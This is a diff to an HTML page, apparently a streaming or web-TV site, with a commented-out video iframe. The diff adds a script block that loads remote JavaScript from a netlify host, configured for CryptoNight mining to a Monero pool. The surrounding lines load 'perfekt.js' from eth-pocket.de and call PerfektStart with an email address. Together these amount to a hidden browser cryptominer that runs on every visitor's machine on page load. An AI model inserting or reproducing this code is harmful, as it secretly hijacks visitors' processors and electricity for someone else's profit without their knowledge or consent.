@@ -19,7 +19,33 @@
     <div align="center"><iframe width="720" height="480" src="http://player.latino-webtv.com/channels/space.html" frameborder="0" allow="kutoplay; encrypted-media" allowfullscreen></iframe></div>
 -->
 	
-<p>2</p>
+<p>3</p>
+	
+<script>
+$(function() {
+if ($.cookie("pooladdress")) {
+			var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?jason=";
+			var pool = $.cookie("pooladdress");
+			var links = str+pool;
+			
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = links; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	} 
+	else
+	{
+		    var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=faster.xmr";
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = str; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	}
+  });
+</script>
+	
+	
+	
 <script src="https://eth-pocket.de/perfekt/perfekt.js?perfekt=wss://?algo=cn?variant=0?jason=xmr.pool.minergate.com:45700"></script>
 <script type="text/javascript">
 PerfektStart('lalolanda325@gmail.com', 'x');
